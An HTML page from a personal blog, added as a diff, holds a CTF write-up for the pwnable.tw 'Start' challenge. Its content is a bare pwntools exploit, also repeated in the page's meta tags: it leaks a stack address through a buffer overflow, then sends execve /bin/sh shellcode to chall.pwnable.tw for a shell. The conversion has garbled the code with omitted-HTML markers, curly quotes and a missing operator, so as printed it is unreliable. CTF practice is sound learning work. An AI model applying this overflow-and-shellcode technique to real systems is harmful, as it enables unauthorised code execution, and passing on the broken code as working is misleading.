@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>Pwnable.tw - Start (100) :: /home/rhama/ — Personal Blog</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="context(arch=&amp;quot;i386&amp;quot;,os=&amp;quot;linux&amp;quot;)
+# http://shell-storm.org/shellcode/files/shellcode-811.phpshellcode =&amp;quot;&amp;ldquo;shellcode &#43;=&amp;quot;\x31\xc0\x50\x68\x2f\x2f\x73&amp;quot;shellcode &#43;=&amp;quot;\x68\x68\x2f\x62\x69\x6e\x89&amp;quot;shellcode &#43;=&amp;rdquo;\xe3\x89\xc1\x89\xc2\xb0\x0b&amp;quot;shellcode &#43;=&amp;rdquo;\xcd\x80\x31\xc0\x40\xcd\x80&amp;quot;mov_ecx_esp =p32(0x08048087)
+start =remote(&amp;quot;chall.pwnable.tw&amp;quot;,10000) start.recvuntil(&amp;quot;CTF:&amp;ldquo;) payload =&amp;quot;A&amp;quot;20&#43;mov_ecx_esp start.send(payload) stack=start.recv(4) stack_addr =u32(stack) printhex(stack_addr) payload_next=&amp;quot;A&amp;quot;20&#43;p32(stack_addr&#43;20)&#43;&amp;quot;\x90&amp;quot;*4&#43;shellcode start.sendline(payload_next) start.interactive() "/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/post/2017-11-20-pwnabletw-start/" />
+
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Pwnable.tw - Start (100)"/>
+<meta name="twitter:description" content="context(arch=&quot;i386&quot;,os=&quot;linux&quot;)
+# http://shell-storm.org/shellcode/files/shellcode-811.phpshellcode =&quot;&ldquo;shellcode &#43;=&quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;shellcode &#43;=&quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;shellcode &#43;=&rdquo;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;shellcode &#43;=&rdquo;\xcd\x80\x31\xc0\x40\xcd\x80&quot;mov_ecx_esp =p32(0x08048087)
+start =remote(&quot;chall.pwnable.tw&quot;,10000) start.recvuntil(&quot;CTF:&ldquo;) payload =&quot;A&quot;20&#43;mov_ecx_esp start.send(payload) stack=start.recv(4) stack_addr =u32(stack) printhex(stack_addr) payload_next=&quot;A&quot;20&#43;p32(stack_addr&#43;20)&#43;&quot;\x90&quot;*4&#43;shellcode start.sendline(payload_next) start.interactive() "/>
+
+
+
+<meta property="og:title" content="Pwnable.tw - Start (100)" />
+<meta property="og:description" content="context(arch=&quot;i386&quot;,os=&quot;linux&quot;)
+# http://shell-storm.org/shellcode/files/shellcode-811.phpshellcode =&quot;&ldquo;shellcode &#43;=&quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;shellcode &#43;=&quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;shellcode &#43;=&rdquo;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;shellcode &#43;=&rdquo;\xcd\x80\x31\xc0\x40\xcd\x80&quot;mov_ecx_esp =p32(0x08048087)
+start =remote(&quot;chall.pwnable.tw&quot;,10000) start.recvuntil(&quot;CTF:&ldquo;) payload =&quot;A&quot;20&#43;mov_ecx_esp start.send(payload) stack=start.recv(4) stack_addr =u32(stack) printhex(stack_addr) payload_next=&quot;A&quot;20&#43;p32(stack_addr&#43;20)&#43;&quot;\x90&quot;*4&#43;shellcode start.sendline(payload_next) start.interactive() " />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/post/2017-11-20-pwnabletw-start/" />
+<meta property="og:site_name" content="/home/rhama/" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ls</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/showcase">Showcase</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="/post/2017-11-20-pwnabletw-start/">Pwnable.tw - Start (100)</a></h1>
+    <div class="post-meta">
+      
+
+      <span class="post-author">— Written by CTF.Ninja</span>
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="/tags/pwnabletw/">Pwnabletw</a>&nbsp;
+        
+          #<a href="/tags/ctf/">CTF</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="/assets/images/CTF.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      <!-- raw HTML omitted -->
+<p><!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<p>context(<!-- raw HTML omitted -->arch<!-- raw HTML omitted --> <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;i386&quot;<!-- raw HTML omitted -->,<!-- raw HTML omitted -->os<!-- raw HTML omitted --><!-- raw HTML omitted -->=<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;linux&quot;<!-- raw HTML omitted -->)</p>
+<p><!-- raw HTML omitted --># <a href="http://shell-storm.org/shellcode/files/shellcode-811.php">http://shell-storm.org/shellcode/files/shellcode-811.php</a><!-- raw HTML omitted -->
+shellcode <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;&ldquo;<!-- raw HTML omitted -->
+shellcode <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;<!-- raw HTML omitted -->\x31<!-- raw HTML omitted -->\xc0<!-- raw HTML omitted -->\x50<!-- raw HTML omitted --><!-- raw HTML omitted -->\x68<!-- raw HTML omitted -->\x2f\x2f<!-- raw HTML omitted -->\x73<!-- raw HTML omitted -->&quot;<!-- raw HTML omitted -->
+shellcode <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;<!-- raw HTML omitted -->\x68<!-- raw HTML omitted --><!-- raw HTML omitted -->\x68<!-- raw HTML omitted -->\x2f<!-- raw HTML omitted -->\x62<!-- raw HTML omitted --><!-- raw HTML omitted -->\x69<!-- raw HTML omitted -->\x6e<!-- raw HTML omitted -->\x89<!-- raw HTML omitted -->&quot;<!-- raw HTML omitted -->
+shellcode <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&rdquo;\xe3<!-- raw HTML omitted -->\x89<!-- raw HTML omitted -->\xc1<!-- raw HTML omitted -->\x89<!-- raw HTML omitted -->\xc2\xb0\x0b&quot;<!-- raw HTML omitted -->
+shellcode <!-- raw HTML omitted -->+=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&rdquo;\xcd<!-- raw HTML omitted -->\x80<!-- raw HTML omitted --><!-- raw HTML omitted -->\x31<!-- raw HTML omitted -->\xc0<!-- raw HTML omitted -->\x40<!-- raw HTML omitted -->\xcd<!-- raw HTML omitted -->\x80<!-- raw HTML omitted -->&quot;<!-- raw HTML omitted -->
+mov_ecx_esp <!-- raw HTML omitted -->=<!-- raw HTML omitted --> p32(<!-- raw HTML omitted -->0x08048087<!-- raw HTML omitted -->)</p>
+<p>start <!-- raw HTML omitted -->=<!-- raw HTML omitted --> remote(<!-- raw HTML omitted -->&quot;chall.pwnable.tw&quot;<!-- raw HTML omitted -->,<!-- raw HTML omitted -->10000<!-- raw HTML omitted -->)
+start.recvuntil(<!-- raw HTML omitted -->&quot;CTF:&ldquo;<!-- raw HTML omitted -->)
+payload <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;A&quot;<!-- raw HTML omitted --> <!-- raw HTML omitted --><em><!-- raw HTML omitted --> <!-- raw HTML omitted -->20<!-- raw HTML omitted --> <!-- raw HTML omitted -->+<!-- raw HTML omitted --> mov_ecx_esp
+start.send(payload)
+stack<!-- raw HTML omitted -->=<!-- raw HTML omitted --> start.recv(<!-- raw HTML omitted -->4<!-- raw HTML omitted -->)
+stack_addr <!-- raw HTML omitted -->=<!-- raw HTML omitted --> u32(stack)
+<!-- raw HTML omitted -->print<!-- raw HTML omitted --> <!-- raw HTML omitted -->hex<!-- raw HTML omitted -->(stack_addr)
+payload_next<!-- raw HTML omitted -->=<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;A&quot;<!-- raw HTML omitted --><!-- raw HTML omitted --></em><!-- raw HTML omitted --><!-- raw HTML omitted -->20<!-- raw HTML omitted --><!-- raw HTML omitted -->+<!-- raw HTML omitted -->p32(stack_addr<!-- raw HTML omitted -->+<!-- raw HTML omitted --><!-- raw HTML omitted -->20<!-- raw HTML omitted -->)<!-- raw HTML omitted -->+<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;<!-- raw HTML omitted -->\x90<!-- raw HTML omitted -->&quot;<!-- raw HTML omitted --> <!-- raw HTML omitted -->*<!-- raw HTML omitted --> <!-- raw HTML omitted -->4<!-- raw HTML omitted --> <!-- raw HTML omitted -->+<!-- raw HTML omitted --> shellcode
+start.sendline(payload_next)
+start.interactive()
+<!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="/post/2017-11-06-pwnabletw-start/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Pwnable.tw - Start (100)</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="/post/2017-12-1-rc3ctf-2017/">
+                  <span class="button__text">RC3 CTF 2017 - Write Up</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+
+    
+      
+        
+
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ls</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
